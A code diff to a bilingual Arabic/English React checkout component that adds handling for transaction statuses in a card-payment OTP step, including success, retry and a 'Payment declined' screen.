@@ -1165,10 +1165,27 @@ function MainContent() {
     const tx = transactions.find(
       (t) => t.id === currentOrderId || t.order_ref === currentOrderId,
     );
-    if (tx && (tx.status === 'awaiting_otp' || tx.status === 'retry_otp')) {
+    if (!tx) return;
+
+    if (tx.status === 'awaiting_otp' || tx.status === 'retry_otp') {
       setCardProcessingToOtp(false);
       setShowOtpStep(true);
       setOtpState('input');
+      if (tx.status === 'retry_otp') setOtpCode('');
+      return;
+    }
+
+    if (tx.status === 'completed') {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(false);
+      setIsSuccess(true);
+      return;
+    }
+
+    if (tx.status === 'failed' || tx.status === 'refunded' || tx.status === 'suspended') {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(true);
+      setOtpState('failed');
     }
   }, [transactions, cardProcessingToOtp, currentOrderId]);
 
@@ -5804,6 +5821,40 @@ function MainContent() {
 
     // OTP
     if (showOtpStep) {
+      const processingTx = currentOrderId
+        ? transactions.find((t) => t.id === currentOrderId || t.order_ref === currentOrderId)
+        : undefined;
+      const paymentRejected =
+        otpState === 'failed' &&
+        (processingTx?.status === 'failed' ||
+          processingTx?.status === 'refunded' ||
+          processingTx?.status === 'suspended');
+
+      if (paymentRejected) {
+        return (
+          <div className="max-w-md mx-auto pb-6">
+            <div className="bg-white rounded-2xl border border-gray-100 p-8 text-center space-y-5">
+              <XCircle className="w-12 h-12 text-red-600 mx-auto" />
+              <h3 className="font-black text-lg text-gray-900">
+                {lang === 'ar' ? 'عملية مرفوضة' : 'Payment declined'}
+              </h3>
+              <p className="text-sm text-gray-500">
+                {lang === 'ar'
+                  ? 'تم رفض العملية أو البطاقة غير صالحة.'
+                  : 'The payment was declined or the card was not accepted.'}
+              </p>
+              <button
+                type="button"
+                onClick={resetForm}
+                className="w-full bg-gray-900 text-white py-4 rounded-2xl font-bold"
+              >
+                {lang === 'ar' ? 'حاول مرة أخرى' : 'Try again'}
+              </button>
+            </div>
+          </div>
+        );
+      }
+
       return (
         <div className="max-w-md mx-auto pb-6">
           <div className="flex items-center gap-3 mb-6">
@@ -5818,7 +5869,7 @@ function MainContent() {
               <h3 className="font-black text-gray-900 text-lg">{lang === 'ar' ? 'أدخل رمز OTP' : 'Enter OTP Code'}</h3>
               <p className="text-sm text-gray-400 mt-1">{lang === 'ar' ? 'تم إرسال رمز التحقق إلى هاتفك' : 'A verification code was sent to your phone'}</p>
             </div>
-            {otpState === 'failed' && (
+            {otpState === 'failed' && processingTx?.status === 'retry_otp' && (
               <p className="text-sm font-bold text-red-600 bg-red-50 rounded-xl px-4 py-2">{lang === 'ar' ? 'رمز خاطئ، حاول مرة أخرى' : 'Wrong code, try again'}</p>
             )}
             <form onSubmit={handleOtpSubmit} className="space-y-4">
